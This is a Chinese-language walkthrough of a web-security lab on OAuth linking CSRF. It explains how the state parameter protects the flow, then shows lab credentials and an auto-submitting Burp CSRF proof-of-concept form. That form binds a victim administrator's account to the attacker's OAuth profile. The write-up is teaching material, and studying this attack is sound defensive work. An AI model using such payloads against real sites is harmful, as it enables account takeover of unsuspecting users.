### OAuth 服务方的绑定关系

首先跳转到 OAuth 服务方，且完成 OAuth 认证后：

- code 绑定授权会话状态：code 唯一对应授权服务器的临时记录，包含`client_id`、`user_id`、`scope`、`redirect_uri`等信息。
- access_token 绑定 client_id 和 user_id：生成时明确关联客户端（`client_id`）和用户（`user_id`），通常还关联权限范围（`scope`），绑定关系存储于服务器或编码在令牌中（如 JWT）。
- code 到 access_token 的间接绑定：code 通过关联的授权会话状态（含`client_id`和`user_id`），决定 access_token 的绑定对象，服务器通过 code 查询这些信息后生成对应令牌。

试想一下，整个授权过程中，攻击者自己在 OAuth 服务方注册账号，然后诱导第三方网站用户使用攻击者自己的 code 换取 token，那么就会导致第三方网站的用户绑定攻击者的 OAuth 账号。

### 第三方服务器阻止上述 CSRF

##### state 参数

**作用**：防御 CSRF 攻击的核心机制。

**流程**：

1. 第三方网站生成 state：发起授权请求时，生成唯一随机值（如加密随机数）。
2. 绑定用户会话：将 state 存储在用户浏览器的 Session 中。
3. 携带 state 访问 OAuth 请求授权。
4. OAuth 返回到 callback 接口的重定向响应。
5. 访问第三方 callback 换取 access token：第三方服务器验证**参数里**的 state 和 cookie 中的 session 是否绑定。

防御原理：

- 验证 state 一致性：第三方网站收到回调后，比对返回的 state 与 Session 中存储的是否一致。

- 攻击者困境：

  攻击者能诱导用户发送自己的 code，但是猜测不出用户的 state 值。导致访问第三服务的 callback 接口时，第三方服务器验证 code 与 state 不匹配。

注：基于 state 的防御，只是验证了 state 和 session 是否绑定，也就是说，它是**完全基于第三方网站的防御**，和 OAuth 服务方**毫无关联**。然而进行 CSRF 访问 callback 时，state 需要作为**参数**而存在，攻击者无法构造出 state 放在表单里。

![image-20250513154326227](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/OAuth%20%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/images/image-20250513154326227.png)

```
博客网站账号：wiener:peter
社交媒体资料：peter.wiener:hotdog
```

### 未使用 state 参数导致的 CSRF

整个 OAuth 过程是传统的授权码模式。

个人信息页面发现一个链接：

```
https://oauth-0af9001103de21b280650b6902e800f5.oauth-server.net/auth?client_id=t44yu1c5jg733p91fyb3u&redirect_uri=https://0a99008503b421e580030d0900070025.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email
```

![image-20250513160241729](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/OAuth%20%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/images/image-20250513160241729.png)

点击后获取一个 code，并重定向到 callback 接口：

![image-20250513160322214](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/OAuth%20%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/images/image-20250513160322214.png)

然后使用此 code 访问 /oauth-linking 页面（callback 接口），完成了个人信息链接到社交媒体。

![image-20250513160400388](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/OAuth%20%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/images/image-20250513160400388.png)

整个操作就两个包：

![image-20250513160652364](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/OAuth%20%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/images/image-20250513160652364.png)

1. 第一个包是访问 OAuth 服务方获取 code。
2. 第二个包是使用 code 访问链接请求。

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a99008503b421e580030d0900070025.web-security-academy.net/oauth-linking">
      <input type="hidden" name="code" value="ALSPTA4DppEl8klCGzhh1EmB7ZEufE4Wadt6HEOtqyt" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

发送给 administrator 用户，此用户使用 wiener 的 code，访问绑定链接，会导致这个网站的 administrator 用户绑定到 OAuth 的 wiener 上，那么使用 OAuth 的 wiener 登录，就可以访问到 administrator  用户。
